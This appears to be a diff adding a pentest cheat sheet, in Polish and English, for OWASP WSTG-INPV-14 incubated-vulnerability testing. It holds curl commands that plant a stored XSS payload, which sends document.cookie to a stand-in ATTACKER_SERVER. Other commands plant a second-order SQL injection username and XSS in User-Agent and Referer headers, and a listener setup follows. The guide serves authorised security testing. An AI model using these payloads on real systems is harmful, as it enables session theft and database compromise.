@@ -1,0 +1,59 @@
+# WSTG-INPV-14 — Testing for Incubated Vulnerability
+
+## Cele
+
+- Identify injections that are stored and require a recall step
+- Understand how a recall step could occur
+- Set listeners or activate the recall step if possible
+
+## KOMENDY
+
+### Stored payload z opoznionym wyzwoleniem
+
+```bash
+# Wstaw XSS payload ktory wyzwoli sie gdy admin otworzy panel
+curl -X POST "https://TARGET/feedback" -d "message=<script>fetch('http://ATTACKER_SERVER/cookie?c='+document.cookie)</script>"
+
+```
+
+### Wstaw SQLi payload do pola ktore jest uzywane pozniej
+
+```bash
+curl -X POST "https://TARGET/register" -d "username=admin'--&email=test@test.com&password=test123"
+
+```
+
+### Log injection (payload w logach)
+
+```bash
+curl -s "https://TARGET/" -H "User-Agent: <script>alert('XSS')</script>"
+curl -s "https://TARGET/" -H "Referer: <script>alert('XSS')</script>"
+
+```
+
+### Ustaw listener na odbiór danych
+
+```bash
+# Na ATTACKER_SERVER:
+# python3 -m http.server 8080
+
+```
+
+## KOMENDY Z WORDLISTAMI
+
+### Kombinacja XSS + SQLi payloadow z wczesniejszych testow
+
+```bash
+# XSS: Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/xss_alert.txt
+# SQLi: Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_Fuzz.txt
+
+```
+
+## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+
+1. Zidentyfikuj pola ktore zapisuja dane i sa wyswietlane pozniej (logi, raporty, panele admina)
+2. Wstaw payloady XSS/SQLi i poczekaj na ich wyzwolenie
+3. Uzyj Burp Collaborator jako listenera
+4. Sprawdz log viewer / admin panel pod katem renderowania payloadow
+5. Testuj second-order SQL injection
+
